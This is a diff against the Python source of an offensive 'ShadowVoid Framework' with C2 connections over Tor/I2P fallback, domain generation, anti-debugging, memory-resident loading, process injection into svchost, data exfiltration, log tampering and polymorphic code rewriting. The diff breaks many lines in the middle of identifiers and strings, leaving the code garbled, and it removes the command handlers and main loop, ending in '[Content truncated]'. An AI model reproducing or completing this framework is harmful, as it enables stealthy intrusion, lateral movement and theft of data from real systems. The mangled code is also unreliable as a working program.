@@ -152,7 +152,8 @@ def make_memory_resident():
                 raise ImportError(f"Module {name} not in memory cache")
 
         memory_loader = MemoryModuleLoader()
-        if memory_loader not in sys.meta_path:
+        if
+ memory_loader not in sys.meta_path:
             sys.meta_path.insert(0, memory_loader)
         return True
     except Exception as e:
@@ -206,7 +207,8 @@ def load_modules():
                         spec.loader.exec_module(module)
                         MODULES[name] = module
             except Exception as e:
-                print('Failed to load module ' + name + ': ' + str(e))
+                print('Fai
+led to load module ' + name + ': ' + str(e))
 
 
 # Stealth Utilities
@@ -282,7 +284,8 @@ def anti_debug_check():
         if platform.system() == 'Linux':
             with open('/proc/self/status', 'r') as f:
                 for line in f:
-                    if line.startswith('TracerPid:'):
+                    if line.sta
+rtswith('TracerPid:'):
                         pid = int(line.split()[1])
                         if pid != 0:
                             sys.exit(0)
@@ -341,7 +344,8 @@ class AES256GCM:
             from Crypto.Cipher import AES
             nonce = os.urandom(self.nonce_size)
             cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
-            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+            cipher
+text, tag = cipher.encrypt_and_digest(plaintext)
             return nonce + tag + ciphertext
         except ImportError:
             nonce = os.urandom(self.nonce_size)
@@ -390,7 +394,8 @@ class DomainGenerator:
 
 # C2 Connection Manager
 class C2Connection:
-    """Persistent C2 connection with automatic Tor/I2P fallback"""
+    """Persistent C2 c
+onnection with automatic Tor/I2P fallback"""
     
     def __init__(self, core):
         self.core = core
@@ -440,7 +445,8 @@ class C2Connection:
             return False
 
     def make_request(self, url, method='GET', data=None, headers=None, encrypt=True):
-        """Make a request through C2 connection with automatic fallback"""
+        """Make a request through C2 connection with automatic fallb
+ack"""
         try:
             if not self.connected:
                 if not self.connect():
@@ -493,7 +499,8 @@ class C2Connection:
         return True
 
     def _persistent_loop(self):
-        """Persistent connection loop"""
+        """Persistent connection loo
+p"""
         while self.running:
             try:
                 if not self.connected:
@@ -553,7 +560,8 @@ class I2PRouter:
                 return result.returncode == 0
             return False
         except:
-            return False
+            retu
+rn False
 
     def make_request(self, url, method='GET', data=None, headers=None, timeout=30):
         try:
@@ -611,7 +619,8 @@ class HeartbeatManager:
         self.jitter = jitter
         self.kill_switch = kill_switch
         self.running = False
-        self.last_heartbeat = datetime.now()
+        self.last_heartbe
+at = datetime.now()
         self.cipher = AES256GCM(generate_key())
         self.c2_connection = c2_connection
 
@@ -666,6 +675,7 @@ class HeartbeatManager:
         return False
 
     def stop(self):
+
         self.running = False
 
 
@@ -730,7 +740,8 @@ def polymorphic_code(original_code):
                     if node.id in self.var_map:
                         node.id = self.var_map[node.id]
                 return node
-        tree = VariableRenamer().visit(tree)
+        tree 
+= VariableRenamer().visit(tree)
         return astunparse.unparse(tree)
     except:
         return original_code
@@ -795,7 +806,8 @@ class ShadowVoidCore:
             pass
 
     def initialize_memory_resident(self):
-        """Initialize memory-resident execution capability"""
+        """Init
+ialize memory-resident execution capability"""
         try:
             make_memory_resident()
             # Cache core modules in memory
@@ -839,7 +851,8 @@ class ShadowVoidCore:
 
     def start_session(self):
         SESSION['active'] = True
-        SESSION['start_time'] = datetime.now()
+        SESSION[
+'start_time'] = datetime.now()
         SESSION['targets'] = []
         SESSION['compromised'] = []
         SESSION['last_heartbeat'] = datetime.now()
@@ -897,7 +910,8 @@ class ShadowVoidCore:
 
     def cmd_scan(self, args):
         if not args:
-            return {'status': 'error', 'message': 'Target required'}
+            return {'status': 'error', 'message': 'Target required'
+}
         target = args[0]
         scan_type = args[1] if len(args) > 1 else 'full'
         recon_module = MODULES.get('recon')
@@ -940,7 +954,8 @@ class ShadowVoidCore:
             target = args[1] if len(args) > 1 else 'svchost'
             return injector.migrate_to_process(target)
         elif subcmd == 'spawn':
-            target = args[1] if len(args) > 1 else 'svchost'
+            target = args[1] if len(args) > 1 else 'svcho
+st'
             return injector.spawn_and_inject(target)
         elif subcmd == 'list':
             processes = injector.list_injectable_processes()
@@ -958,101 +973,6 @@ class ShadowVoidCore:
             return {'status': 'error', 'message': 'Source and destination required'}
         source = args[0]
         destination = args[1]
-        channel = args[2] if len(args) > 2 else 'http'
-        post_exploit_module = MODULES.get('post_exploit')
-        if post_exploit_module:
-            post_instance = post_exploit_module.PostExploitModule(self)
-            return post_instance.exfiltrate(source, destination, channel)
-        return {'status': 'error', 'message': 'Post-exploit module not available'}
+        channe
 
-    def cmd_clean(self, args):
-        try:
-            scrub_history()
-            log_tampering()
-            return {'status': 'success', 'message': 'Logs and artifacts scrubbed'}
-        except Exception as e:
-            return {'status': 'error', 'message': str(e)}
-
-    def cmd_modules(self, args):
-        if not args or args[0] == 'list':
-            modules = [{'name': name, 'status': 'loaded'} for name in MODULES.keys()]
-            return {'status': 'success', 'modules': modules}
-        return {'status': 'error', 'message': 'Invalid modules command'}
-
-    def cmd_c2(self, args):
-        if not args:
-            return {'status': 'error', 'message': 'C2 command required'}
-        subcmd = args[0]
-        if subcmd == 'status':
-            status = {
-                'enabled': CONFIG['c2']['enabled'],
-                'tor': self.tor_router is not None and self.tor_router.is_available(),
-                'i2p': self.i2p_router is not None and self.i2p_router.is_available(),
-                'dga': self.dga is not None,
-                'heartbeat': self.heartbeat is not None,
-                'persistent_connection': self.c2_connection is not None and self.c2_connection.connected
-            }
-            return {'status': 'success', 'c2_status': status}
-        elif subcmd == 'generate':
-            if self.dga:
-                count = int(args[1]) if len(args) > 1 else 10
-                domains = self.dga.generate_domains(count)
-                return {'status': 'success', 'domains': domains}
-        return {'status': 'error', 'message': 'Invalid C2 command'}
-
-    def cmd_help(self, args):
-        help_text = "ShadowVoid Framework - Memory-Resident Offensive Security Orchestrator\n\nCOMMANDS:\n  init                    Initialize stealth environment\n  scan <target> [type]   Run reconnaissance\n  exploit <cve> [target] Execute exploit chain\n  pivot <target> [method] Establish lateral movement\n  inject <cmd> [args]    Process injection (migrate/spawn/list/substitute/cleanup)\n  exfil <source> <dest> [channel] Start data exfiltration\n  clean                  Scrub logs and artifacts\n  modules list           List loaded modules\n  c2 status              Show C2 status\n  c2 generate [count]    Generate DGA domains\n  help                   Show this help\n  exit                   End session and exit"
-        return {'status': 'success', 'help': help_text}
-
-    def cmd_exit(self, args):
-        self.end_session()
-        return {'status': 'success', 'message': 'Exiting ShadowVoid Framework'}
-
-
-def main():
-    core = ShadowVoidCore()
-    if len(sys.argv) > 1:
-        command = ' '.join(sys.argv[1:])
-        result = core.execute_command(command)
-        if SESSION.get('kill_switch_triggered'):
-            core.end_session()
-            sys.exit(0)
-        if result:
-            print(json.dumps(result, indent=2))
-    else:
-        print("ShadowVoid Framework - Interactive Mode")
-        print("Type 'help' for commands, 'exit' to quit")
-        while True:
-            try:
-                command = input("sv> ").strip()
-                if not command:
-                    continue
-                if command.startswith('!'):
-                    quick_cmd = command[1:]
-                    if quick_cmd == 'scan':
-                        command = 'scan'
-                    elif quick_cmd == 'exploit':
-                        command = 'exploit'
-                    elif quick_cmd == 'pivot':
-                        command = 'pivot'
-                    elif quick_cmd == 'exfil':
-                        command = 'exfil'
-                    elif quick_cmd == 'inject':
-                        command = 'inject'
-                    elif quick_cmd == 'clean':
-                        command = 'clean'
-                result = core.execute_command(command)
-                if SESSION.get('kill_switch_triggered'):
-                    core.end_session()
-                    break
-                if result:
-                    print(json.dumps(result, indent=2))
-            except (KeyboardInterrupt, EOFError):
-                core.end_session()
-                break
-            except Exception as e:
-                print('Error: ' + str(e))
-
-
-if __name__ == '__main__':
-    main()
+... [Content truncated]
